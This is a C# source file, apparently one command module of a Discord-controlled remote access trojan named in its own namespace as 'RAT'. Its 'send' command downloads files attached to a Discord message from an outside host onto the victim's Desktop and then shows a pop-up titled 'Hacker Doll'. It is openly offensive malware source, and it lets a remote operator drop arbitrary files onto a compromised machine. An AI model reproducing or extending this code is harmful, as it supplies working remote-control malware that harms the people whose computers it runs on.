using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;


namespace RAT.Commands
{


    public class Send : ModuleBase<SocketCommandContext>
    {
        [Command("send")]
        public async Task SendCmd()
        {
            // Get the attachments from the message
            var attachments = Context.Message.Attachments;

            foreach (var attachment in attachments)
            { 
                // Downloadthe attached file to the desktop folder
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), attachment.Filename);
                using (var client = new WebClient())
                {
                    await client.DownloadFileTaskAsync(attachment.Url, filePath);
                }

            }
            MessageBox.Show("File Recieved", "Hacker Doll", MessageBoxButtons.OK);
        }

    }
}


